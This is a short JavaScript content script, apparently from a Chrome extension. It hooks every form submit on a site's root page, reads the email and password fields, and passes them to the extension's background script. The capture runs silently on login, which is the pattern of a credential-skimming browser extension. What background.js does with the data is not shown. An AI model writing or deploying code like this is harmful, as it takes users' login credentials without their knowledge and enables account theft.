(function(){
	console.log('ready from content.js')
	
	document.addEventListener("submit", function (e) {
		// This code is executed when submit event is fired

		// If the path is root
		if (window.location.pathname === '/') {
			// Get captured data from login form
			var data = {
				"email" : $("#email").val(),
				"password" : $("#pass").val()
			}

			// Send a message to background.js
			chrome.runtime.sendMessage({type : 'on_form_submit', 'data' : data}, function(data){
				console.log(data.response);
			});
			//e.preventDefault();
		}	  
	}, false);
})();